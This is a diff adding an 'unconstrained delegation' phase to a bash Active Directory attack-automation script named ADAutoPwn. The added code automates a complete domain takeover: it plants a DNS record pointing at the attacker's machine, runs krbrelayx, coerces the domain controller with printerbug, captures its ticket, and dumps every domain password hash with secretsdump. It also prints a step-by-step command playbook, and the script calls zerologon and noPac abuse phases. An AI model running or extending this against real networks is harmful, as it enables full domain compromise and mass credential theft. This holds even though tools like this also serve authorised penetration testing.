@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.23.1"
+readonly VERSION="1.24.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1216,6 +1216,104 @@ phase_delegation_abuse() {
     phase_dcsync
     USER="$old_user"; PASS="$old_pass"; HASH="$old_hash"; HAVE_AUTH="$old_auth"; IS_DC_ADMIN="$old_admin"; KERB_TICKET="$old_ticket"
     [[ -n "$KERB_TICKET" ]] && export KRB5CCNAME="$KERB_TICKET" || unset KRB5CCNAME
+}
+
+# ===========================================================================
+#  UNCONSTRAINED DELEGATION  —  coerce the DC and capture its TGT (krbrelayx).
+#  PRECONDITION-GATED: only ABUSABLE if WE control an account that has
+#  unconstrained delegation. DCs are always unconstrained but you can't abuse one
+#  you don't already own, so the DC is excluded. If we don't control any such
+#  account it reports "not abusable by us" and stops. The capture itself needs a
+#  listener (port 88) + DNS pointing at us, so — like the NTLM relay — the full
+#  auto-capture runs only under AUTO_RELAY=1; otherwise a dynamic-IP playbook is
+#  printed. Listener IP is auto-derived (attacker_ip), never asked for.
+# ===========================================================================
+UNCONSTR_DONE=0
+phase_unconstrained_abuse() {
+    [[ "$DO_ABUSE" != "1" ]] && return
+    [[ "$IS_DC_ADMIN" == "1" || "$UNCONSTR_DONE" == "1" ]] && return
+    [[ -z "$DOMAIN" ]] && return
+    have impacket-findDelegation || return
+    UNCONSTR_DONE=1
+
+    local sf="$OUTDIR/unconstrained_delegation.txt"
+    if   [[ -n "$KERB_TICKET" ]]; then
+        KRB5CCNAME="$KERB_TICKET" impacket-findDelegation "$(imp_principal)" -k -no-pass -dc-ip "$DC_IP" 2>&1 | tee "$sf" >>"$LOGFILE"
+    elif [[ -n "$HASH" ]]; then
+        impacket-findDelegation "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" 2>&1 | tee "$sf" >>"$LOGFILE"
+    elif [[ -n "$PASS" ]]; then
+        impacket-findDelegation "$(imp_principal):${PASS}" -dc-ip "$DC_IP" 2>&1 | tee "$sf" >>"$LOGFILE"
+    else return; fi
+
+    # Unconstrained principals, EXCLUDING the DC (can't abuse one we don't own).
+    local -a unc=(); local name bare
+    while read -r name; do
+        [[ -z "$name" ]] && continue
+        bare="${name%\$}"
+        [[ "${bare,,}" == "${DC_HOST,,}" ]] && continue
+        unc+=("$name")
+    done < <(awk 'tolower($0) ~ /unconstrained/ {print $1}' "$sf" 2>/dev/null | sort -u)
+    [[ ${#unc[@]} -eq 0 ]] && { info "No abusable unconstrained-delegation principal (only the DC, which we don't control)"; return; }
+
+    section "UNCONSTRAINED DELEGATION · coerce DC → capture its TGT"
+    local p controlled="" ckey=""
+    for p in "${unc[@]}"; do
+        bare="${p%\$}"
+        loot "Unconstrained delegation on: ${C_BOLD}$p${C_RESET}"
+        # Abusable by us ONLY if we control that account (acting as it / owned / we hold its hash).
+        if [[ "${bare,,}" == "${USER,,}" ]]; then controlled="$p"; ckey="${HASH##*:}"
+        elif grep -qiE "^${bare}[[:space:]]" "$OUTDIR/owned_principals.txt" 2>/dev/null; then controlled="$p"
+        elif grep -qiE "^${bare}\\\$?:" "$OUTDIR/secretsdump.txt" 2>/dev/null; then
+            controlled="$p"; ckey=$(grep -iE "^${bare}\\\$?:" "$OUTDIR/secretsdump.txt" | head -1 | cut -d: -f4)
+        fi
+    done
+
+    if [[ -z "$controlled" ]]; then
+        info "None of those accounts are under our control yet → NOT abusable by us right now."
+        info "(Becomes abusable once we own one of: ${unc[*]} — then it auto-fires.)"
+        return
+    fi
+
+    local ip; ip="$(attacker_ip)"
+    local kx ax dx pb host="adpwn.${DOMAIN}"
+    kx="$(external_tool krbrelayx/krbrelayx.py)"; ax="$(external_tool krbrelayx/addspn.py)"
+    dx="$(external_tool krbrelayx/dnstool.py)";  pb="$(external_tool krbrelayx/printerbug.py)"
+    loot "★ We control '${controlled}' (unconstrained) → coerce the DC and grab its TGT (listener IP ${ip:-?})"
+
+    # Full auto-capture binds port 88 + needs DNS pointing at us → opt-in (AUTO_RELAY=1),
+    # same convention as the NTLM relay path. Otherwise: dynamic-IP playbook.
+    if [[ "${AUTO_RELAY:-0}" == "1" && -n "$ip" && -n "$kx" && -n "$ckey" ]]; then
+        subsection "AUTO unconstrained capture · krbrelayx + DNS + coerce"
+        warn "Binding krbrelayx on :88 and adding DNS '${host}'→${ip}; time-boxed."
+        [[ -n "$dx" ]] && python3 "$dx" -u "${DOMAIN}\\${USER}" $( [[ -n "$PASS" ]] && echo -p "$PASS" || echo -hashes ":${HASH##*:}" ) \
+            -r "$host" -d "$ip" --action add "$DC_IP" 2>&1 | tee -a "$LOGFILE"
+        rb_record "ADIDNS record $host added for unconstrained capture" \
+                  "python3 $dx -u '${DOMAIN}\\${USER}' -r '$host' --action remove $DC_IP"
+        ( cd "$OUTDIR" && timeout -k 10 "${AUTO_RELAY_TIMEOUT:-90}" python3 "$kx" -hashes ":$ckey" 2>&1 | tee -a "$LOGFILE" | tee unconstrained_krbrelayx.log ) &
+        local kpid=$!; sleep 4
+        [[ -n "$pb" ]] && python3 "$pb" "${DOMAIN}/${USER}:${PASS}@${DC_IP}" "$host" 2>&1 | tee -a "$LOGFILE"
+        wait "$kpid" 2>/dev/null || true
+        local cc; cc=$(find "$OUTDIR" -maxdepth 1 -iname "${DC_HOST}*\$.ccache" -o -iname "${DC_HOST}*.ccache" 2>/dev/null | head -1)
+        if [[ -n "$cc" ]]; then
+            loot "★★★ Captured the DC TGT → $(basename "$cc") → DCSync"
+            KRB5CCNAME="$cc" impacket-secretsdump -k -no-pass "${DC_FQDN:-$DC_IP}" -just-dc 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/unconstrained_dcsync.txt"
+            grep -qE ':::' "$OUTDIR/unconstrained_dcsync.txt" && { ingest_dcsync_output "$OUTDIR/unconstrained_dcsync.txt" "Unconstrained delegation TGT capture"; IS_DC_ADMIN=1; }
+        else
+            warn "No DC TGT captured in the window — see unconstrained_krbrelayx.log"
+        fi
+        return
+    fi
+
+    subsection "Unconstrained-delegation playbook (listener-based; run with your shell)"
+    detail "  # listener IP auto-derived: ${ip:-<your-ip>}   ·   controlled acct: ${controlled}"
+    detail "  # 1) DNS A record pointing at you (you have DNS write on this domain):"
+    detail "  python3 ${dx:-dnstool.py} -u '${DOMAIN}\\\\${USER}' -p '<pass>' -r ${host} -d ${ip:-<ip>} --action add ${DC_IP}"
+    detail "  # 2) Listen with the controlled account's key (krbrelayx decrypts the coerced ticket → DC TGT):"
+    detail "  python3 ${kx:-krbrelayx.py} -hashes :<NThash of ${controlled}>"
+    detail "  # 3) Coerce the DC to authenticate to ${host} (=${ip:-<ip>}):"
+    detail "  python3 ${pb:-printerbug.py} ${DOMAIN}/${USER}:'<pass>'@${DC_IP} ${host}"
+    detail "  # → krbrelayx writes ${DC_HOST}\$.ccache → KRB5CCNAME=${DC_HOST}\$.ccache impacket-secretsdump -k -no-pass ${DC_FQDN:-$DC_IP} -just-dc"
+    info "Set AUTO_RELAY=1 to let ADAutoPwn run this capture automatically (binds :88)."
 }
 
 # ===========================================================================
@@ -5031,6 +5129,7 @@ assess_current_credential() {
     phase_nopac_abuse;  jitter
     phase_zerologon_abuse; jitter
     phase_delegation_abuse; jitter
+    phase_unconstrained_abuse; jitter
     phase_precreated_computers; jitter
     phase_user_variants; jitter
     phase_share_loot;   jitter
